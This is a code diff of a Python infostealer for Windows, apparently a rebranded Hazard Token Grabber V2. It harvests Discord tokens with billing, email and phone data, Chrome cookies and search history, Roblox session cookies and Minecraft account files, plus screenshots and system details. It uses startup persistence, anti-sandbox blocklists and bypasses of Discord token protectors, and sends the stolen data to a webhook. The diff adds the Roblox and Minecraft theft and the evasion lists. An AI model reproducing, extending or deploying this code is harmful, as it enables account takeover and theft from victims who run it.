@@ -22,27 +22,18 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-__author__ = "kalaZnikoV"
+__author__ = "ahmetcn67"
 __version__ = '1.8.8'
 __license__ = "GPL-3.0"
 __config__ = {
-
     'webhook': "WEBHOOK_HERE",  
-
     'webhook_protector_key': "KEY_HERE",
-    
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
-
     'ping_on_run': False,
-
     'kill_processes': True,
-
     'startup': True,
-
     'hide_self': True,
-
     'anti_debug': True,
-
     'blackListedPrograms':
     [
         "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr",
@@ -156,7 +147,7 @@ class Functions(object):
         return __config__.get(e)
 
 
-class HazardTokenGrabberV2(Functions):
+class nikoVGrabber(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
@@ -301,7 +292,6 @@ class HazardTokenGrabberV2(Functions):
                     pass
 
     async def bypassTokenProtector(self):
-
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not ntpath.exists(tp):
             return
@@ -318,7 +308,7 @@ class HazardTokenGrabberV2(Functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['Discord Token Grabber by kalaZnikoV'] = "https://github.com/ahmetcn67"
+                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -335,7 +325,7 @@ class HazardTokenGrabberV2(Functions):
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
-                f.write("\n\n//Discord Token Grabber by kalaZnikoV | https://github.com/ahmetcn67")
+                f.write("\n\n//nikoV Grabber | https://github.com/ahmetcn67")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
@@ -343,7 +333,7 @@ class HazardTokenGrabberV2(Functions):
             x = self.hook_reg
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
-                content = txt.replace(x, 'Discord Token Grabber by kalaZnikoV')
+                content = txt.replace(x, 'RdimoTheGoat')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
@@ -432,7 +422,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabCookies(self):
-        f = open(ntpath.join(self.dir, 'Google', 'Google Cookieleri.txt'), 'w', encoding="cp437", errors='ignore')
+        f = open(ntpath.join(self.dir, 'Google', 'Google Cookie.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
                 login_db = ntpath.join(self.chrome_user_data, prof, 'Network', 'cookies')
@@ -459,7 +449,7 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabHistory(self):
-        f = open(ntpath.join(self.dir, 'Google', 'Google Search.txt'), 'w', encoding="cp437", errors='ignore')
+        f = open(ntpath.join(self.dir, 'Google', 'Google AramaGecmisi.txt'), 'w', encoding="cp437", errors='ignore')
 
         def extract_search_history(db_cursor):
             db_cursor.execute('SELECT term FROM keyword_search_terms')
@@ -478,7 +468,7 @@ class HazardTokenGrabberV2(Functions):
 
         for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(self.chrome_user_data, prof, 'Arama Gecmisi')
+                login_db = ntpath.join(self.chrome_user_data, prof, 'History')
                 login = self.create_temp_file()
 
                 shutil.copy2(login_db, login)
@@ -496,7 +486,7 @@ class HazardTokenGrabberV2(Functions):
         f.close()
 
     def neatifyTokens(self):
-        f = open(self.dir + "\\Discord Bilgileri.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
             j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
             user = j.get('username') + '#' + str(j.get("discriminator"))
@@ -506,35 +496,62 @@ class HazardTokenGrabberV2(Functions):
             if (flags == 1):
                 badges += "Discord Yetkilisi, "
             if (flags == 2):
-                badges += "Discord Partneri, "
+                badges += "Partner, "
             if (flags == 4):
                 badges += "Hypesquad Etkinligi, "
             if (flags == 8):
                 badges += "Yesil Bug Avcisi, "
             if (flags == 64):
-                badges += "Hypesquad Bravery Hanedanligi, "
+                badges += "Hypesquad Bravery, "
             if (flags == 128):
-                badges += "HypeSquad Brillance Hanedanligi, "
+                badges += "HypeSquad Brillance, "
             if (flags == 256):
-                badges += "HypeSquad Balance Hanedanligi, "
+                badges += "HypeSquad Balance, "
             if (flags == 512):
                 badges += "Erken Destekci, "
             if (flags == 16384):
                 badges += "Altin Bug Avcisi, "
             if (flags == 131072):
-                badges += "Oneylanmis Bot Gelistiricisi, "
+                badges += "Onaylanmis Bot Gelistiricisi, "
             if (badges == ""):
-                badges = "Yok"
+                badges = "None"
 
             email = j.get("email")
-            phone = j.get("phone") if j.get("phone") else "Her Hangi Bir Telefon Numarasi Baglanmamis"
+            phone = j.get("phone") if j.get("phone") else "Hic bir telefon numarasi baglanmamis"
             nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
-            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Rozeti: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
+            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
+    def grabMinecraftCache(self):
+        minecraft = ntpath.join(self.dir, 'Minecraft')
+        os.makedirs(minecraft, exist_ok=True)
+        mc = ntpath.join(self.roaming, '.minecraft')
+        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
+
+        for _file in to_grab:
+            if ntpath.exists(ntpath.join(mc, _file)):
+                shutil.copy2(ntpath.join(mc, _file), minecraft + self.sep + _file)
+
+    def grabRobloxCookie(self):
+        def subproc(path):
+            try:
+                return subprocess.check_output(
+                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
+                    creationflags=0x08000000).decode().rstrip()
+            except Exception:
+                return None
+        reg_cookie = subproc(r'HKLM')
+        if not reg_cookie:
+            reg_cookie = subproc(r'HKCU')
+        if reg_cookie:
+            self.robloxcookies.append(reg_cookie)
+        if self.robloxcookies:
+            with open(self.dir + "\\Roblox Cookie.txt", "w") as f:
+                for i in self.robloxcookies:
+                    f.write(i + '\n')
 
     def screenshot(self):
         image = ImageGrab.grab(
@@ -543,7 +560,7 @@ class HazardTokenGrabberV2(Functions):
             all_screens=True,
             xdisplay=None
         )
-        image.save(self.dir + "\\ekranalintisi.png")
+        image.save(self.dir + "\\AnlikEkranAlintisi.png")
         image.close()
 
     def sys_dump(self):
@@ -567,7 +584,7 @@ Org: {self.org}
 GoogleMaps: {self.googlemap}
 {line_sep}
         """
-        with open(self.dir + "\\Sistem Bilgileri.txt", "w", encoding="utf-8", errors='ignore') as f:
+        with open(self.dir + "\\PC Bilgileri.txt", "w", encoding="utf-8", errors='ignore') as f:
             f.write(about)
 
     def finish(self):
@@ -581,11 +598,11 @@ GoogleMaps: {self.googlemap}
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("nikoV Grabber\n\n")
+                            f.write("🌟・Grabber By github.com/ahmetcn67・\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x + "\n\nnikoV Grabber")
+                            fp.write(x + "\n\n🌟・Grabber By github.com/ahmetcn67・")
 
-        _zipfile = ntpath.join(self.appdata, f'nikoV grabber-[{Victim}].zip')
+        _zipfile = ntpath.join(self.appdata, f'nikoVGrabber-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -609,12 +626,12 @@ GoogleMaps: {self.googlemap}
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* nikoV Grabber Calistirdi',
-                        'url': 'https://github.com/ahmetcn67',
+                        'name': f'*{Victim}* nikoV Grabber calistirdi',
+                        'url': 'https://github.com/ahmetcn67/98765432',
                         'icon_url': 'https://yt3.ggpht.com/fOGPRUF0KvXJCka3DZ4_ebfawLenyROYCIhVqdjFrnIWVmHBVN1GodrhkHMQaALplMoAjQwz=s900-c-k-c0x00ffffff-no-rj'
                     },
                     'color': 176185,
-                    'description': f'[Google Maps Konumu]({self.googlemap})',
+                    'description': f'[Google Haritalar Konumu]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
@@ -656,7 +673,7 @@ GoogleMaps: {self.googlemap}
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By kalaznikov'
+                        'text': '🌟・Grabber By github.com/ahmetcn67・'
                     }
                 }
             ]
@@ -684,10 +701,24 @@ class AntiDebug(Functions):
         self.processes = list()
 
         self.blackListedUsers = [
-       "EmrEnes67",
+            "WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
+            "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
         ]
         self.blackListedPCNames = [
-       "AHMETCAN",
+            "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
+            "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
+            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
+        ]
+        self.blackListedHWIDS = [
+            "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
+            "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
+            "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4",
+            "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
+            "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF",
+            "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
+            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
+            "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
+            "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
         ]
 
         for func in [self.listCheck, self.registryCheck, self.specsCheck]:
@@ -722,7 +753,7 @@ class AntiDebug(Functions):
 
     def specsCheck(self):
 
-        if int(ram) <= 2:   
+        if int(ram) <= 2:  
             self.programExit()
         if int(disk) <= 50:  
             self.programExit()
@@ -749,4 +780,4 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')
     except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
-    asyncio.run(HazardTokenGrabberV2().init())
+    asyncio.run(nikoVGrabber().init())
